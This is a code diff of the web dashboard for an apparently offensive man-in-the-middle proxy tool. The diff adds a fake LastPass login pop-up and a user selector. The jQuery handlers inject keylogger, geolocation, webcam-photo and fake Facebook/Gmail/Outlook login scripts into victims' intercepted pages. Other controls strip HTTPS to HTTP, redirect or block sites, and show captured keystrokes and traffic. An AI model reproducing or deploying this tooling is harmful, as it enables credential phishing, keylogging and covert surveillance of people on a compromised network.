@@ -3,19 +3,16 @@
 
 <header class="row">
   <h1 class="col-md-4">Shakespeare Dashboard</h1>
-  <h4 class="col-md-8 attackType">disabled...</h4>
+  <h4 class="col-md-8 attackType">none selected</h4>
   <p></p>
 </header>
 <div class="main row">
   <section class="col-md-4 proxy-controls">
     <div class="panel panel-default">
       <!-- Default panel contents -->
-      <div class="panel-heading">Proxy Controls
+      <div class="panel-heading"><h5>Proxy Controls</h5>
       </div>
-      <!-- <div class="panel-body">
-        <small>Configure your smallroxy. Checked Setting will be activated.</small>
-      </div>
- -->
+
       <!-- List group -->
       <ul class="list-group">
         <li class="list-group-item">
@@ -27,11 +24,31 @@
             </label>
           </div>
           <h4>Simple Proxy</h4>
-          <small>Allow all connections through, however the requests and responses will be stored as HAR files and any body that is sent with the request can be viewed in the HAR viewer below.</small>
+          <small>Allows all connections through however data will be stored as a HAR file</small>
         </li>
 
-        <li class="list-group-item" id="replaceImages" title="this currently does not work"><s>Replace All Images</s></li>
-        <li class="list-group-item" id="flipImages" title="this currently does not work"><s>Flip Images</s></li>
+        <li class="list-group-item">
+          <div class="onoffswitch">
+            <input type="checkbox" name="replaceImages" class="onoffswitch-checkbox" id="replaceImages" disabled="true">
+            <label class="onoffswitch-label" for="replaceImages">
+              <span class="onoffswitch-inner"></span>
+              <span class="onoffswitch-switch"></span>
+            </label>
+          </div>
+          <h4><s>Replace All Images</s></h4>
+    <small>Replace the images on the page - disabled currently</small>
+        </li>
+        <li class="list-group-item">
+          <div class="onoffswitch">
+            <input type="checkbox" name="flipImages" class="onoffswitch-checkbox" id="flipImages" disabled="true">
+            <label class="onoffswitch-label" for="flipImages">
+              <span class="onoffswitch-inner"></span>
+              <span class="onoffswitch-switch"></span>
+            </label>
+          </div>
+          <h4><s>Flip Images</s></h4>
+        <small>Flip the images on the page 180 degrees - disabled currently</small>
+        </li>
         <li class="list-group-item">
           <div class="onoffswitch">
             <input type="checkbox" name="redirect" class="onoffswitch-checkbox" id="redirect">
@@ -41,7 +58,7 @@
             </label>
           </div>
           <h4>Redirect URLs</h4>
-          <small>Check if the site is in the array of sites to redirect, and if so will redirect to a local page with the same name i.e ft.com will get redirected to ft.html - NOTE: All redirected pages have the key logger automatically injected into them.</small>
+          <small>If url is in whitelist (currently hardcoded), the client will be redirected to local page of same name. This cant handle HTTPS/HSTS</small>
         </li>
 
         <li class="list-group-item">
@@ -53,11 +70,11 @@
             </label>
           </div>
           <h4>Block URLs</h4>
-          <small>Block sites that are in the list of sites to block however it cannot handle HSTS.</small>
+          <small>If url is in whitelist (currently hardcoded), the client will be blocked. This cant handle HTTPS/HSTS</small>
         </li>
         <li class="list-group-item list-group-item-toggle dropdown-toggle" aria-expanded="false">
           <a data-toggle="collapse" href="#collapseInject" aria-expanded="true" data-toggle="dropdown" aria-controls="collapseInject"><h4>Inject Hook in HTTP <span class="caret"></span></h4>
-          <small>Different scripts for different injections. All scripts get an automatic jquery injection.</small>
+          <small>Array of scripts that can be injected into the clients page</small>
           </a>
           <ul class="list-group collapse" id="collapseInject">
 
@@ -70,7 +87,7 @@
                 </label>
               </div>
               <h4>Keylogger</h4>
-              <small>Inject a keylogger into the page if it can (i.e HTTP)</small>
+              <small>Inject a keylogger into the page.</small>
             </li>
 
             <li class="list-group-item">
@@ -94,7 +111,7 @@
                 </label>
               </div>
               <h4>Get Location</h4>
-              <small>Attempt to get the user's location It will try and use the users public IP aswell as request them to give up their location more accurately.</small>
+              <small>Attempt to get the user's location</small>
             </li>
 
             <li class="list-group-item">
@@ -105,9 +122,20 @@
                   <span class="onoffswitch-switch"></span>
                 </label>
               </div>
-              <h4>Request User Location</h4>
-              <small>It will try and use the users public IP aswell as request them to give up their location more accurately.</small>
+              <h4>Request User Login</h4>
+              <small>Request user Login to facebook, gmail or hotmail/outlook</small>
             </li>
+           <li class="list-group-item">
+            <div class="onoffswitch">
+              <input type="checkbox" name="requestLastpass" class="onoffswitch-checkbox" id="requestLastpass">
+              <label class="onoffswitch-label" for="requestLastpass">
+                <span class="onoffswitch-inner"></span>
+                <span class="onoffswitch-switch"></span>
+              </label>
+            </div>
+            <h4>Request Lastpass Login</h4>
+            <small>Pop up a lastpass login on the user's screen</small>
+          </li>
           </ul>
         <li class="list-group-item">
         <div class="onoffswitch">
@@ -118,7 +146,7 @@
             </label>
           </div>
           <h4>Wolf Pack Hack</h4>
-          <small>This will attempt to stop the clients request and make the same request itself. It will then pass the response from the server back to the client, but over HTTP. If it experiences HSTS then it will block the request. It is recommended to try and get the user to click on links to pages that are HSTS where possible.</small>
+          <small>Blocks pages that redirect to HTTPS and makes the connection itself. It then responds to the client with the server response over HTTP</small>
         </li>
       </ul>
     </div>
@@ -129,6 +157,7 @@
 
       <!-- Nav tabs -->
       <ul class="nav nav-tabs" role="tablist">
+        <li role="presentation"><a href="#SelectUser" aria-controls="SelectUser" role="tab" data-toggle="tab">Select User</a></li>
         <li role="presentation" class="active"><a href="#hars" aria-controls="hars" role="tab" data-toggle="tab">Har Viewer</a></li>
         <li role="presentation"><a href="#logs" aria-controls="logs" role="tab" data-toggle="tab">Key Logs</a></li>
         <li role="presentation"><a href="#wifiRequests" aria-controls="wifiRequests" role="tab" data-toggle="tab"><s>Discover Local WiFi Requests</s></a></li>
@@ -168,6 +197,11 @@
         <div role="tabpanel" class="tab-pane" id="CreateAP">
           <input type="text" class=".input-prepend" title="name for the wifi access point" placeholder="access point name">
         </div>
+        <div role="tabpanel" class="tab-pane" id="SelectUser">
+          <ul>
+            <li>Select user here and it will be updated above</li>
+          <ul>
+        </div>
       </div>
 
     </div>
@@ -182,7 +216,6 @@
   })
   $("#passthrough").click(function() {
     $.get( "/PassThrough", function( data ) {
-      $(".attackType").html("Simple - capture headers")
     });
   })
   $("#deletehars").click(function() {
@@ -196,54 +229,51 @@
   })
   $("#intercept").click(function() {
     $.get( "/InterceptHTTPS", function( data ) {
-      $(".attackType").html("Wolf Pack Hack - remove HTTPS")
     });
   })
   $("#flipImages").click(function() {
-    alert("flipping images currently disabled")
+    // alert("flipping images currently disabled")
     // $.get( "/FlipImages", function( data ) {
     //   $(".attackType").html("Flip Images")
     // });
   })
   $("#replaceImages").click(function() {
-    alert("Replacing images currently disabled")
+    // alert("Replacing images currently disabled")
     // $.get( "/FlipImages", function( data ) {
     //   $(".attackType").html("Flip Images")
     // });
   })
   $("#redirect").click(function() {
     $.get( "/RedirectPage", function( data ) {
-      $(".attackType").html("Redirect Websites: " + data)
     });
   })
   $("#block").click(function() {
     $.get( "/BlockWebsites", function( data ) {
-      $(".attackType").html("Block Websites: " + data)
     });
   })
   $("#keylogger").click(function() {
     $.get( "/InjectScript?replace=</body>&result=%3Cscript%20src%3D%22http://127.0.0.1:9000/public/InjectionScripts%2Fkeylogger.js%22%3E%3C%2Fscript%3E</body>", function( data ) {
-      $(".attackType").html("Injected - Keylogger")
     });
   })
  $("#getLocation").click(function() {
     $.get( "/InjectScript?replace=</body>&result=%3Cscript%20src%3D%22http://127.0.0.1:9000/public/InjectionScripts%2FgetLocation.js%22%3E%3C%2Fscript%3E</body>", function( data ) {
-      $(".attackType").html("Injected - request location")
     });
   })
  $("#takePhoto").click(function() {
     $.get( "/InjectScript?replace=</body>&result=%3Cscript%20src%3D%22http://127.0.0.1:9000/public/InjectionScripts%2FtakePhoto.js%22%3E%3C%2Fscript%3E</body>", function( data ) {
-      $(".attackType").html("Injected - request photo")
     });
   })
    $("#requestLogin").click(function() {
     $.get( "/InjectScript?replace=</body>&result=%3Cscript%20src%3D%22http://127.0.0.1:9000/public/InjectionScripts%2Flogin.js%22%3E%3C%2Fscript%3E</body>", function( data ) {
-      $(".attackType").html("Injected - request Login")
+    });
+  })
+   $("#requestLastpass").click(function() {
+    $.get( "/InjectScript?replace=</body>&result=%3Cscript%20src%3D%22http://127.0.0.1:9000/public/InjectionScripts%2FlastpassInjection.js%22%3E%3C%2Fscript%3E</body>", function( data ) {
     });
   })
   $("#getKeyLogs").click(function() {
     $('#userLogs').html("")//clear
-      $.get("/App/GetData", function ( data ) {
+      $.get("/App/GetKeylogs", function ( data ) {
         var lastURL = data[0].Page
         $('#userLogs').append(lastURL+"<p>")
         $.each(data, function(i, j) {
@@ -304,7 +334,6 @@
 var har;
 function initHarView(){
    $('#har-view').data('HarView', null);
-   // har = null;
    $('#hars-discovered').empty()
    $('#har-view').html('');
    $('#har-view').HarView();
